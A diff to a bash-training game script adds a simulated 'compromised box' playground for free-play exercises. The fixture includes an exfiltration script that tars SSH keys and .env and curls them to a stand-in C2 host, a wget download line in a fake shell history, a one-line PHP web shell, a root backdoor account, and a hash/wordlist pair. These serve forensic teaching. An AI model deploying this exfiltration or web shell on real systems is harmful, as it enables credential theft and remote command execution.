@@ -169,7 +169,7 @@ _strip_ansi() {
   REPLY="$out"
 }
 
-VERSION="1.8.2"
+VERSION="1.9.0"
 SANDBOX_TIMEOUT=5      # Seconds before sandbox command times out
 BOSS_THRESHOLD=4       # Correct answers needed to beat boss (out of BOSS_TOTAL)
 BOSS_TOTAL=5           # Number of questions in boss round
@@ -501,6 +501,8 @@ _SANDBOX_GEN=5  # fixture generation - bump to force a pristine rebuild on exist
 _GEN_CHAINS_TMP=""  # live gen_chains temp dir, reaped by _cleanup if a signal interrupts it
 _GAUNTLET_DIR=""    # when set, the gauntlet owns a randomised fixture tree it also grades against
 _GAUNTLET_PRISTINE="" # the gauntlet tree's own pristine, so a reset restores THOSE fixtures
+_PLAY_DIR=""        # the playground owns its own compromised-box tree, never the shared sandbox
+_PLAY_PRISTINE=""   # that tree's pristine, so the playground's `reset` restores THOSE fixtures
 
 _BWRAP_FLAG="$DATA/.bwrap_blocked"
 _bwrap_notice() {
@@ -859,6 +861,133 @@ _gen_gauntlet_files() {
   } > "$dir/traffic.log"
 }
 
+# Fixture overlay for the PLAYGROUND only. The standard tree plus a "someone got in"
+# layer: dotfiles, an intruder's shell history, an auth.log with the break-in still in
+# it, a world-writable cron script, an encoded note, an archive, a hash + wordlist pair,
+# and a junk pile worth a find/xargs. Three flag{...} tokens are planted so free-play has
+# an actual goal instead of a blank prompt (see _play_hint / the mission card in play()).
+# It lives in its OWN tree (never $SANDBOX_PRISTINE), so nothing here can shift a graded
+# level's answer — the same isolation the gauntlet uses.
+_gen_play_files() {
+  local dir="$1"
+  _gen_sandbox_files "$dir" || return 1
+
+  # ── dotfiles: the first thing `ls -la` should reward ──
+  printf '%s\n' \
+    'APP_ENV=production' 'APP_DEBUG=false' 'DB_HOST=db.internal' 'DB_USER=appuser' \
+    'DB_PASS=correct-horse-battery-staple' 'REDIS_URL=redis://localhost:6379' \
+    'SESSION_KEY=8f14e45fceea167a5a36dedd4bea2543' > "$dir/.env"
+  # The intruder's own history: every breadcrumb in this tree is reachable from here,
+  # so `cat .bash_history` is the one command that unlocks the rest of the box.
+  printf '%s\n' \
+    'ls -la' 'cat .env' 'sudo -l' 'find / -perm -4000 2>/dev/null' \
+    'cat /etc/passwd | grep -c bash' 'wget http://c2.evil.test/collect.sh -O bin/collect.sh' \
+    'chmod 666 bin/collect.sh' 'crontab incident/crontab' \
+    'base64 -w0 notes.md > vault/notes.b64 && rm notes.md' \
+    'tar czf archive/site-backup.tar.gz web/' 'history -c' > "$dir/.bash_history"
+  mkdir -p "$dir/.ssh"
+  printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----' \
+    'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW' \
+    'RUNTUxOQAAACBub3RhcmVhbGtleXRoaXNpc2FwbGF5Z3JvdW5kZml4dHVyZQAAAJhwbGF5' \
+    'Z3JvdW5kZml4dHVyZW5vdGFyZWFsa2V5AAAAC3NzaC1lZDI1NTE5AAAAIG5vdGFyZWFsa2' \
+    '-----END OPENSSH PRIVATE KEY-----' > "$dir/.ssh/id_rsa"
+  chmod 600 "$dir/.ssh/id_rsa"
+  printf '%s\n' 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHnotarealkey ops@workstation' \
+    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHalsonotreal root@c2.evil.test' > "$dir/.ssh/authorized_keys"
+  printf '%s\n' '[db.internal]:22 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfakehostkey' \
+    '[c2.evil.test]:2222 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfakehostkeytwo' > "$dir/.ssh/known_hosts"
+
+  # ── incident/: the break-in, still on disk ──
+  mkdir -p "$dir/incident"
+  { local _i _t
+    for ((_i=0; _i<24; _i++)); do
+      printf -v _t '%(%b %e %H:%M:%S)T' "$((1770000000 + _i*37))"
+      printf '%s box sshd[%d]: Failed password for invalid user %s from 203.0.113.66 port %d ssh2\n' \
+        "$_t" "$((2000+_i))" "$(printf 'admin root oracle postgres test deploy git jenkins' | cut -d' ' -f$((_i%8+1)))" "$((40000+_i*13))"
+    done
+    printf -v _t '%(%b %e %H:%M:%S)T' "$((1770000000 + 24*37))"
+    printf '%s box sshd[2101]: Accepted publickey for deploy from 203.0.113.66 port 40761 ssh2\n' "$_t"
+    printf -v _t '%(%b %e %H:%M:%S)T' "$((1770000000 + 25*37))"
+    printf '%s box sudo:   deploy : TTY=pts/1 ; PWD=/sandbox ; USER=root ; COMMAND=/bin/bash\n' "$_t"
+  } > "$dir/incident/auth.log"
+  printf '%s\n' 'root:x:0:0:root:/root:/bin/bash' 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin' \
+    'sandbox:x:1000:1000:sandbox:/sandbox:/bin/bash' 'deploy:x:1001:1001:deploy:/home/deploy:/bin/bash' \
+    'backdoor:x:0:0:system:/root:/bin/bash' 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin' > "$dir/incident/passwd"
+  printf '%s\n' '# m h dom mon dow  command' '*/5 * * * *  /sandbox/bin/collect.sh >/dev/null 2>&1' \
+    '0 3 * * *    /sandbox/backup.sh' > "$dir/incident/crontab"
+
+  # ── bin/collect.sh: world-writable, phones home. The `find -perm` lesson with a body. ──
+  mkdir -p "$dir/bin"
+  printf '%s\n' '#!/bin/bash' '# staged by the intruder - runs every 5 minutes from cron' \
+    'HOST=c2.evil.test' 'tar czf /tmp/.c 2>/dev/null /sandbox/.ssh /sandbox/.env' \
+    'curl -s -X POST --data-binary @/tmp/.c "http://$HOST/upload" || true' \
+    'rm -f /tmp/.c' > "$dir/bin/collect.sh"
+  chmod 666 "$dir/bin/collect.sh"
+
+  # ── vault/: encoded, not encrypted (flag 2) + a hash/wordlist pair to crack ──
+  mkdir -p "$dir/vault"
+  printf '%s' 'IyBWYXVsdApiYWNrdXAgcGFzc3BocmFzZTogaHVudGVyMgpmbGFne2Jhc2U2NF9pc19ub3RfZW5jcnlwdGlvbn0K' > "$dir/vault/notes.b64"
+  printf '\n' >> "$dir/vault/notes.b64"
+  # Every hash is md5 of a word that IS in wordlist.txt, hashed with no trailing newline
+  # (what hashcat/john do). The header line says so on purpose: `echo w | md5sum` hashes
+  # the newline too and matches nothing, which is a dead end, not a lesson.
+  printf '%s\n' '# md5, password hashed with no trailing newline' \
+    'deploy:2ab96390c7dbe3439de74d0c9b0b1767' 'svc_backup:0d107d09f5bbe40cade3de5c71e9e9b7' \
+    'root:d4bda60d8d790aa9cde7a92177bd0bc6' 'ci:a4d80eac9ab26a4a2da04125bc2c096a' \
+    'monitor:e6078b9b1aac915d11b9fd59791030bf' > "$dir/vault/hashes.txt"
+  printf '%s\n' hunter2 letmein password123 correct-horse-battery-staple s3cr3t \
+    opensesame changeme qwerty dragon trustno1 > "$dir/vault/wordlist.txt"
+
+  # ── web/ + archive/: the tarball still holds what was deleted from disk (flag 3) ──
+  mkdir -p "$dir/web/uploads"
+  printf '%s\n' '<!doctype html>' '<html><head><title>internal tools</title></head>' \
+    '<body><h1>internal tools</h1>' '<ul>' '<li><a href="/admin">admin</a></li>' \
+    '<li><a href="/uploads">uploads</a></li>' '</ul></body></html>' > "$dir/web/index.html"
+  printf '%s\n' 'Options -Indexes' 'AuthType Basic' 'AuthName "restricted"' \
+    'AuthUserFile /sandbox/web/.htpasswd' 'Require valid-user' > "$dir/web/.htaccess"
+  printf '%s\n' 'admin:$apr1$notreal$hashhashhashhashhash0' > "$dir/web/.htpasswd"
+  printf '%s\n' '<?php' '// uploaded 12/Feb 08:31 - not by us' \
+    '@system($_REQUEST["c"]);' '?>' > "$dir/web/uploads/avatar.php.txt"
+  mkdir -p "$dir/archive"
+  local _stage; if _stage=$(mktemp -d "${TMPDIR:-/tmp}/cmdchamp.XXXXXX" 2>/dev/null); then
+    mkdir -p "$_stage/web"
+    printf '%s\n' '<?php' '$DB_HOST = "db.internal";' '$DB_USER = "appuser";' \
+      '$DB_PASS = "correct-horse-battery-staple";' '// flag{tar_it_up_and_look_inside}' '?>' > "$_stage/web/config.php"
+    cp "$dir/web/index.html" "$_stage/web/index.html" 2>/dev/null
+    tar czf "$dir/archive/site-backup.tar.gz" -C "$_stage" web 2>/dev/null
+    rm -rf "$_stage"
+  fi
+
+  # ── the boring-but-real stuff: bulk files, a big log, hostile filenames, a locked file ──
+  mkdir -p "$dir/junk"
+  local _exts=(tmp bak log old swp cache) _j _e
+  for ((_j=1; _j<=60; _j++)); do
+    _e=${_exts[$((_j % 6))]}
+    printf 'entry %d\n' "$_j" > "$dir/junk/file$(printf '%02d' "$_j").$_e"
+  done
+  printf '%s\n' 'quoting is not optional' > "$dir/junk/report final (v2).txt"
+  printf '%s\n' 'globs will not save you here' > "$dir/junk/-weird-name.txt"
+  { local _b; for ((_b=1; _b<=2000; _b++)); do
+      printf '2026-02-12 %02d:%02d:%02d %s worker[%d] request handled in %dms\n' \
+        $((_b/3600%24)) $((_b/60%60)) $((_b%60)) \
+        "$( ((_b % 97 == 0)) && printf ERROR || printf INFO )" $((_b%8+1)) $((_b%450+3))
+    done; } > "$dir/big.log"
+  printf '%s\n' 'you cannot read this until you chmod it' > "$dir/locked.txt"
+  return 0
+}
+
+# Paths the playground deliberately leaves unreadable, and the helper that locks them.
+# They are locked on the LIVE tree only, never in the pristine copy: _sandbox_reset copies
+# the pristine as this user, and a mode-000 file there would fail the copy outright - which
+# disables the sandbox, not just the reset. So the pristine stays readable and the lock is
+# re-applied after every reset.
+_PLAY_LOCKED=(locked.txt)
+_play_lock() {
+  local _d=$1 _f
+  for _f in "${_PLAY_LOCKED[@]}"; do chmod 000 "$_d/$_f" 2>/dev/null; done
+  return 0
+}
+
 _sandbox_init() {
   ((SANDBOX_MODE)) || return 0
   _check_bwrap || return 1
@@ -1082,6 +1211,8 @@ _cleanup() {
   ((_interactive)) && printf '\e[?25h\e[?2004l'  # restore cursor + disable bracketed paste
   [[ -n "${_GEN_CHAINS_TMP:-}" ]] && rm -rf "$_GEN_CHAINS_TMP" 2>/dev/null  # reap a gen_chains temp caught mid-build by a signal
   [[ -n "${_GAUNTLET_PRISTINE:-}" ]] && rm -rf "$_GAUNTLET_PRISTINE" 2>/dev/null  # reap the gauntlet's own pristine on a signal
+  [[ -n "${_PLAY_DIR:-}" ]] && rm -rf "$_PLAY_DIR" 2>/dev/null            # reap the playground's tree on a signal
+  [[ -n "${_PLAY_PRISTINE:-}" ]] && rm -rf "$_PLAY_PRISTINE" 2>/dev/null  # and its pristine
   ((_CLEANING)) && return; _CLEANING=1
   ((_interactive)) || return 0
   rm -rf "$DATA/sandbox.snap" "$DATA/sandbox.snap.perms" 2>/dev/null
@@ -2427,7 +2558,7 @@ gen_level8() {
   questions+=("If ${W}${cfg}${C} is readable, cat it; else echo 'denied'§test -r ${cfg} && cat ${cfg} || echo 'denied'§[[ -r ${cfg} ]] && cat ${cfg} || echo 'denied'§[ -r ${cfg} ] && cat ${cfg} || echo 'denied'")
   questions+=("Check if ${W}${log}${C} has ${Y}${term}${C}, show first ${n} matches§grep ${term} ${log} | head -${n}§grep -m ${n} ${term} ${log}§grep --max-count ${n} ${term} ${log}§grep -q ${term} ${log} && grep ${term} ${log} | head -${n}§grep --quiet ${term} ${log} && grep ${term} ${log} | head -${n}§grep --silent ${term} ${log} && grep ${term} ${log} | head -${n}§grep -q ${term} ${log} && grep -m ${n} ${term} ${log}§grep --quiet ${term} ${log} && grep -m ${n} ${term} ${log}§grep --silent ${term} ${log} && grep -m ${n} ${term} ${log}§grep -q ${term} ${log} && grep --max-count ${n} ${term} ${log}§grep --quiet ${term} ${log} && grep --max-count ${n} ${term} ${log}§grep --silent ${term} ${log} && grep --max-count ${n} ${term} ${log}")
   questions+=("If ${W}${txt}${C} exists, sort and save to ${W}sorted.txt${C}§test -e ${txt} && sort ${txt} > sorted.txt§[[ -e ${txt} ]] && sort ${txt} > sorted.txt§[ -e ${txt} ] && sort ${txt} > sorted.txt§test -f ${txt} && sort ${txt} > sorted.txt§[[ -f ${txt} ]] && sort ${txt} > sorted.txt§[ -f ${txt} ] && sort ${txt} > sorted.txt")
-  questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, save matches or echo 'none'§grep ${term} ${log} > matches.txt || echo 'none'§grep '${term}' ${log} > matches.txt || echo 'none'§grep \"${term}\" ${log} > matches.txt || echo 'none'")
+  questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, save matches to ${W}matches.txt${C} or echo 'none'§grep ${term} ${log} > matches.txt || echo 'none'§grep '${term}' ${log} > matches.txt || echo 'none'§grep \"${term}\" ${log} > matches.txt || echo 'none'")
   questions+=("Run pwd, ls, date one after another regardless of errors|pwd ; ls ; date|~^pwd\\s*;\\s*ls\\s*;\\s*date$")
 }
 
@@ -2467,10 +2598,10 @@ gen_level9() {
   questions+=("Save ${Y}${term}${C} matches from ${W}${log}${C} to ${W}matches.txt${C}, echo \"Found: N\"§grep ${term} ${log} > matches.txt && echo \"Found: \$(wc -l < matches.txt)\"§grep ${term} ${log} > matches.txt && echo \"Found: \$(wc --lines < matches.txt)\"")
   questions+=("If ${W}${txt}${C} exists store its line count in variable ${Y}${cvar}${C}, else store 0§${cvar}=\$(test -e ${txt} && wc -l < ${txt} || echo 0)§${cvar}=\$([[ -e ${txt} ]] && wc -l < ${txt} || echo 0)§${cvar}=\$([ -e ${txt} ] && wc -l < ${txt} || echo 0)§${cvar}=\"\$(test -e ${txt} && wc -l < ${txt} || echo 0)\"§${cvar}=\"\$([[ -e ${txt} ]] && wc -l < ${txt} || echo 0)\"§${cvar}=\"\$([ -e ${txt} ] && wc -l < ${txt} || echo 0)\"§${cvar}=\$(test -f ${txt} && wc -l < ${txt} || echo 0)§${cvar}=\$([[ -f ${txt} ]] && wc -l < ${txt} || echo 0)§${cvar}=\$([ -f ${txt} ] && wc -l < ${txt} || echo 0)§${cvar}=\"\$(test -f ${txt} && wc -l < ${txt} || echo 0)\"§${cvar}=\"\$([[ -f ${txt} ]] && wc -l < ${txt} || echo 0)\"§${cvar}=\"\$([ -f ${txt} ] && wc -l < ${txt} || echo 0)\"")
   questions+=("Store hostname in variable ${Y}${hvar}${C}, then echo \"Host: \$${Y}${hvar}${C}\" if set§${hvar}=\$(hostname) && echo \"Host: \$${hvar}\"§${hvar}=\$HOSTNAME && echo \"Host: \$${hvar}\"§${hvar}=\"\$(hostname)\" && echo \"Host: \$${hvar}\"§${hvar}=\${HOSTNAME} && echo \"Host: \$${hvar}\"")
-  questions+=("Print today's date inline|echo \"Today is \$(date +%Y-%m-%d)\"|echo \"Today is \$(date +%F)\"|echo \"Today is \`date +%Y-%m-%d\`\"|echo \"Today is \`date +%F\`\"")
+  questions+=("Print date inline: \"Today is YYYY-MM-DD\"|echo \"Today is \$(date +%Y-%m-%d)\"|echo \"Today is \$(date +%F)\"|echo \"Today is \`date +%Y-%m-%d\`\"|echo \"Today is \`date +%F\`\"")
   questions+=("Echo 'User is' followed by username|echo \"User is \$(whoami)\"|echo \"User is \$USER\"|echo \"User is \${USER}\"|echo \"User is \`whoami\`\"")
-  questions+=("Print hostname and current directory§echo \"Host: \$(hostname), Dir: \$(pwd)\"§echo \"Host: \$HOSTNAME, Dir: \$(pwd)\"§echo \"Host: \$(hostname), Dir: \$PWD\"§echo \"Host: \$HOSTNAME, Dir: \$PWD\"§echo \"Host: \${HOSTNAME}, Dir: \$(pwd)\"§echo \"Host: \${HOSTNAME}, Dir: \${PWD}\"§echo \"Host: \$(hostname), Dir: \${PWD}\"§echo \"Host: \${HOSTNAME}, Dir: \$PWD\"§echo \"Host: \`hostname\`, Dir: \`pwd\`\"§echo \"Host: \`hostname\`, Dir: \$PWD\"§echo \"Host: \`hostname\`, Dir: \${PWD}\"")
-  questions+=("Show file info: name, lines, words in ${W}${txt}${C}§echo \"${txt}: \$(wc -l < ${txt}) lines, \$(wc -w < ${txt}) words\"§echo \"${txt}: \$(wc --lines < ${txt}) lines, \$(wc --words < ${txt}) words\"§echo \"${txt}: \`wc -l < ${txt}\` lines, \`wc -w < ${txt}\` words\"")
+  questions+=("Print host and dir: \"Host: <hostname>, Dir: <cwd>\"§echo \"Host: \$(hostname), Dir: \$(pwd)\"§echo \"Host: \$HOSTNAME, Dir: \$(pwd)\"§echo \"Host: \$(hostname), Dir: \$PWD\"§echo \"Host: \$HOSTNAME, Dir: \$PWD\"§echo \"Host: \${HOSTNAME}, Dir: \$(pwd)\"§echo \"Host: \${HOSTNAME}, Dir: \${PWD}\"§echo \"Host: \$(hostname), Dir: \${PWD}\"§echo \"Host: \${HOSTNAME}, Dir: \$PWD\"§echo \"Host: \`hostname\`, Dir: \`pwd\`\"§echo \"Host: \`hostname\`, Dir: \$PWD\"§echo \"Host: \`hostname\`, Dir: \${PWD}\"")
+  questions+=("Show ${W}${txt}${C} info: \"${txt}: N lines, N words\"§echo \"${txt}: \$(wc -l < ${txt}) lines, \$(wc -w < ${txt}) words\"§echo \"${txt}: \$(wc --lines < ${txt}) lines, \$(wc --words < ${txt}) words\"§echo \"${txt}: \`wc -l < ${txt}\` lines, \`wc -w < ${txt}\` words\"")
   questions+=("Store sorted unique lines from ${W}${txt}${C} in variable ${Y}${var}${C}§${var}=\$(sort -u ${txt})§${var}=\$(sort --unique ${txt})§${var}=\$(sort ${txt} | uniq)§${var}=\"\$(sort -u ${txt})\"§${var}=\"\$(sort --unique ${txt})\"§${var}=\"\$(sort ${txt} | uniq)\"")
   questions+=("Store first ${n} lines of ${W}${log}${C} in variable ${Y}${var}${C}|${var}=\$(head -${n} ${log})|${var}=\$(head -n ${n} ${log})|${var}=\"\$(head -${n} ${log})\"|${var}=\"\$(head -n ${n} ${log})\"")
   questions+=("Echo path: /home/\$USER|echo \"/home/\$USER\"|echo /home/\$USER|echo \"/home/\${USER}\"|echo /home/\${USER}")
@@ -2505,11 +2636,11 @@ gen_level10() {
   questions+=("Start ${W}./${script}${C} in background, print its PID§./${script} & echo \$!§./${script} & echo \${!}§bash ${script} & echo \$!§bash ${script} & echo \${!}§sh ${script} & echo \$!§sh ${script} & echo \${!}")
   questions+=("Search ${Y}${term}${C} in ${W}${log}${C} with grep -q, then echo exit status§grep -q ${term} ${log} ; echo \$?§grep --quiet ${term} ${log} ; echo \$?§grep --silent ${term} ${log} ; echo \$?§grep ${term} ${log} > /dev/null ; echo \$?§grep ${term} ${log} > /dev/null 2>&1 ; echo \$?§grep ${term} ${log} &> /dev/null ; echo \$?")
   questions+=("Store last exit status in variable ${Y}status${C}, then echo 'ok' if it was 0§status=\$? ; [[ \$status -eq 0 ]] && echo ok§status=\$? ; [ \$status -eq 0 ] && echo ok§status=\$? ; test \$status -eq 0 && echo ok§status=\$? ; (( status == 0 )) && echo ok§status=\$? ; [[ \$status == 0 ]] && echo ok§status=\$? ; [[ \$status = 0 ]] && echo ok§status=\$? ; [ \$status = 0 ] && echo ok§status=\$? ; (( \$status == 0 )) && echo ok")
-  questions+=("Test if last command succeeded (exit 0)|[[ \$? -eq 0 ]] && echo success|[ \$? -eq 0 ] && echo success|[ \$? = 0 ] && echo success|[ \$? == 0 ] && echo success|test \$? -eq 0 && echo success|(( \$? == 0 )) && echo success|[[ \$? == 0 ]] && echo success|[[ \$? = 0 ]] && echo success|test \$? = 0 && echo success|test \$? == 0 && echo success")
+  questions+=("Test if last command succeeded (exit 0), echo ${W}success${C}|[[ \$? -eq 0 ]] && echo success|[ \$? -eq 0 ] && echo success|[ \$? = 0 ] && echo success|[ \$? == 0 ] && echo success|test \$? -eq 0 && echo success|(( \$? == 0 )) && echo success|[[ \$? == 0 ]] && echo success|[[ \$? = 0 ]] && echo success|test \$? = 0 && echo success|test \$? == 0 && echo success")
   questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, append exit status to ${W}status.log${C}§grep ${term} ${log} ; echo \$? >> status.log§grep ${term} ${log} ; echo \${?} >> status.log§grep '${term}' ${log} ; echo \$? >> status.log")
   questions+=("Run ${W}ls /nonexistent${C} silencing its stderr, print 'failed' to stderr if it fails§ls /nonexistent 2>/dev/null ; [[ \$? -ne 0 ]] && echo failed >&2§ls /nonexistent 2>/dev/null ; [ \$? -ne 0 ] && echo failed >&2§ls /nonexistent 2>/dev/null ; test \$? -ne 0 && echo failed >&2§ls /nonexistent 2>/dev/null || echo failed >&2§ls /nonexistent 2>/dev/null ; [[ \$? -ne 0 ]] && echo failed 1>&2§ls /nonexistent 2>/dev/null ; [ \$? -ne 0 ] && echo failed 1>&2§ls /nonexistent 2>/dev/null ; test \$? -ne 0 && echo failed 1>&2§ls /nonexistent 2>/dev/null || echo failed 1>&2§ls /nonexistent 2>/dev/null ; [[ \$? != 0 ]] && echo failed >&2§ls /nonexistent 2>/dev/null ; [ \$? != 0 ] && echo failed >&2§ls /nonexistent 2>/dev/null ; [[ \$? != 0 ]] && echo failed 1>&2§ls /nonexistent 2>/dev/null ; [ \$? != 0 ] && echo failed 1>&2")
   questions+=("List files in home directory using \$HOME|ls \$HOME|ls \$HOME/|ls ~|ls ~/|ls \${HOME}|ls \${HOME}/")
-  questions+=("Create file in home using \$HOME|touch \$HOME/test.txt|touch ~/test.txt|touch \${HOME}/test.txt")
+  questions+=("Create ${W}test.txt${C} in home using \$HOME|touch \$HOME/test.txt|touch ~/test.txt|touch \${HOME}/test.txt")
   questions+=("Print your username|whoami|id -un|echo \$USER|echo \${USER}|echo \"\$USER\"")
   questions+=("Print your numeric user ID|id -u|echo \$UID|echo \${UID}")
   questions+=("Print all your group names|id -Gn|id -nG|groups")
@@ -2543,7 +2674,7 @@ gen_level11() {
   questions+=("Run ${W}${script}${C} in background, print its PID§./${script} & echo \$!§./${script} & echo \${!}§bash ${script} & echo \$!§sh ${script} & echo \$!")
   questions+=("Start ${Y}sleep 60${C} in background, show PID|sleep 60 & echo \$!|sleep 60 & echo \${!}")
   questions+=("Run ${W}${script}${C} in background and wait for it by PID§./${script} & pid=\$! && wait \$pid§./${script} & wait \$!§./${script} & pid=\${!} && wait \$pid§./${script} & wait \${!}")
-  questions+=("Start ${W}${script}${C} in background, save PID to file§./${script} & echo \$! > pid.txt§./${script} & echo \${!} > pid.txt")
+  questions+=("Start ${W}${script}${C} in background, save PID to ${W}pid.txt${C}§./${script} & echo \$! > pid.txt§./${script} & echo \${!} > pid.txt")
   questions+=("Run ${W}${script}${C} > ${W}${outfile}${C} in background, sleep 1, then grep '${term}' in ${W}${outfile}${C}§./${script} > ${outfile} & sleep 1 && grep ${term} ${outfile}")
   questions+=("Tail ${W}${log}${C} in background|tail -f ${log} &|tail --follow ${log} &|tail -F ${log} &")
   questions+=("Grep ${Y}${term}${C} from ${W}${log}${C} in background, save to ${W}matches.txt${C}|grep ${term} ${log} > matches.txt &|rg ${term} ${log} > matches.txt &")
@@ -2587,11 +2718,11 @@ gen_level12() {
   questions+=("If ${W}${log}${C} is non-empty, count ${Y}${term}${C} matches|[[ -s ${log} ]] && grep -c ${term} ${log}|[[ -s ${log} ]] && grep --count ${term} ${log}|[ -s ${log} ] && grep -c ${term} ${log}|[ -s ${log} ] && grep --count ${term} ${log}|test -s ${log} && grep -c ${term} ${log}|test -s ${log} && grep --count ${term} ${log}|[[ -s ${log} ]] && rg -c ${term} ${log}|[ -s ${log} ] && rg -c ${term} ${log}|test -s ${log} && rg -c ${term} ${log}")
   questions+=("Test if ${W}${log}${C} contains ${Y}${term}${C}§[[ -f ${log} ]] && grep -q ${term} ${log}§[[ -f ${log} ]] && grep --quiet ${term} ${log}§[[ -f ${log} ]] && grep --silent ${term} ${log}§[ -f ${log} ] && grep -q ${term} ${log}§[ -f ${log} ] && grep --quiet ${term} ${log}§[ -f ${log} ] && grep --silent ${term} ${log}§test -f ${log} && grep -q ${term} ${log}§test -f ${log} && grep --quiet ${term} ${log}§test -f ${log} && grep --silent ${term} ${log}§rg -q ${term} ${log}§rg --quiet ${term} ${log}")
   questions+=("If ${W}${txt}${C} is writable, append timestamp|[[ -w ${txt} ]] && date >> ${txt}|[ -w ${txt} ] && date >> ${txt}|test -w ${txt} && date >> ${txt}")
-  questions+=("If ${W}${script}${C} is executable, run and log output|[[ -x ${script} ]] && ./${script} > output.log 2>&1|[[ -x ${script} ]] && ./${script} &> output.log|[[ -x ${script} ]] && ./${script} >& output.log|[ -x ${script} ] && ./${script} > output.log 2>&1|[ -x ${script} ] && ./${script} &> output.log|[ -x ${script} ] && ./${script} >& output.log|test -x ${script} && ./${script} > output.log 2>&1|test -x ${script} && ./${script} &> output.log|test -x ${script} && ./${script} >& output.log")
+  questions+=("If ${W}${script}${C} is executable, run it, log stdout+stderr to ${W}output.log${C}|[[ -x ${script} ]] && ./${script} > output.log 2>&1|[[ -x ${script} ]] && ./${script} &> output.log|[[ -x ${script} ]] && ./${script} >& output.log|[ -x ${script} ] && ./${script} > output.log 2>&1|[ -x ${script} ] && ./${script} &> output.log|[ -x ${script} ] && ./${script} >& output.log|test -x ${script} && ./${script} > output.log 2>&1|test -x ${script} && ./${script} &> output.log|test -x ${script} && ./${script} >& output.log")
   questions+=("Test if directory ${W}${dir}${C} exists, create if not§[[ -d ${dir} ]] || mkdir -p ${dir}§[ -d ${dir} ] || mkdir -p ${dir}§test -d ${dir} || mkdir -p ${dir}§[[ -d ${dir} ]] || mkdir --parents ${dir}§[ -d ${dir} ] || mkdir --parents ${dir}§test -d ${dir} || mkdir --parents ${dir}§[[ -d ${dir} ]] || mkdir ${dir}§[ -d ${dir} ] || mkdir ${dir}§test -d ${dir} || mkdir ${dir}")
   questions+=("If ${W}${txt}${C} exists cat it, else echo 'missing'§[[ -e ${txt} ]] && cat ${txt} || echo 'missing'§[ -e ${txt} ] && cat ${txt} || echo 'missing'§test -e ${txt} && cat ${txt} || echo 'missing'§[[ -e ${txt} ]] && cat ${txt} || echo \"missing\"§[ -e ${txt} ] && cat ${txt} || echo \"missing\"§test -e ${txt} && cat ${txt} || echo \"missing\"§[[ -f ${txt} ]] && cat ${txt} || echo 'missing'§[ -f ${txt} ] && cat ${txt} || echo 'missing'§test -f ${txt} && cat ${txt} || echo 'missing'§[[ -f ${txt} ]] && cat ${txt} || echo \"missing\"§[ -f ${txt} ] && cat ${txt} || echo \"missing\"§test -f ${txt} && cat ${txt} || echo \"missing\"")
-  questions+=("If ${W}${cfg}${C} is writable, backup it and echo done|[[ -w ${cfg} ]] && cp ${cfg} ${cfg}.bak && echo done|[ -w ${cfg} ] && cp ${cfg} ${cfg}.bak && echo done|test -w ${cfg} && cp ${cfg} ${cfg}.bak && echo done|[[ -w ${cfg} ]] && cp ${cfg} ${cfg}.bak && echo 'done'|[ -w ${cfg} ] && cp ${cfg} ${cfg}.bak && echo 'done'|test -w ${cfg} && cp ${cfg} ${cfg}.bak && echo 'done'")
-  questions+=("Check ${W}${txt}${C} exists or exit with error§[[ -e ${txt} ]] || { echo 'not found' >&2; exit 1; }§[ -e ${txt} ] || { echo 'not found' >&2; exit 1; }§test -e ${txt} || { echo 'not found' >&2; exit 1; }§[[ -e ${txt} ]] || { echo \"not found\" >&2; exit 1; }§[ -e ${txt} ] || { echo \"not found\" >&2; exit 1; }§test -e ${txt} || { echo \"not found\" >&2; exit 1; }§[[ -f ${txt} ]] || { echo 'not found' >&2; exit 1; }§[ -f ${txt} ] || { echo 'not found' >&2; exit 1; }§test -f ${txt} || { echo 'not found' >&2; exit 1; }§[[ -f ${txt} ]] || { echo \"not found\" >&2; exit 1; }§[ -f ${txt} ] || { echo \"not found\" >&2; exit 1; }§test -f ${txt} || { echo \"not found\" >&2; exit 1; }")
+  questions+=("If ${W}${cfg}${C} is writable, copy it to ${W}${cfg}.bak${C} and echo done|[[ -w ${cfg} ]] && cp ${cfg} ${cfg}.bak && echo done|[ -w ${cfg} ] && cp ${cfg} ${cfg}.bak && echo done|test -w ${cfg} && cp ${cfg} ${cfg}.bak && echo done|[[ -w ${cfg} ]] && cp ${cfg} ${cfg}.bak && echo 'done'|[ -w ${cfg} ] && cp ${cfg} ${cfg}.bak && echo 'done'|test -w ${cfg} && cp ${cfg} ${cfg}.bak && echo 'done'")
+  questions+=("Check ${W}${txt}${C} exists, else echo 'not found' to stderr and exit 1§[[ -e ${txt} ]] || { echo 'not found' >&2; exit 1; }§[ -e ${txt} ] || { echo 'not found' >&2; exit 1; }§test -e ${txt} || { echo 'not found' >&2; exit 1; }§[[ -e ${txt} ]] || { echo \"not found\" >&2; exit 1; }§[ -e ${txt} ] || { echo \"not found\" >&2; exit 1; }§test -e ${txt} || { echo \"not found\" >&2; exit 1; }§[[ -f ${txt} ]] || { echo 'not found' >&2; exit 1; }§[ -f ${txt} ] || { echo 'not found' >&2; exit 1; }§test -f ${txt} || { echo 'not found' >&2; exit 1; }§[[ -f ${txt} ]] || { echo \"not found\" >&2; exit 1; }§[ -f ${txt} ] || { echo \"not found\" >&2; exit 1; }§test -f ${txt} || { echo \"not found\" >&2; exit 1; }")
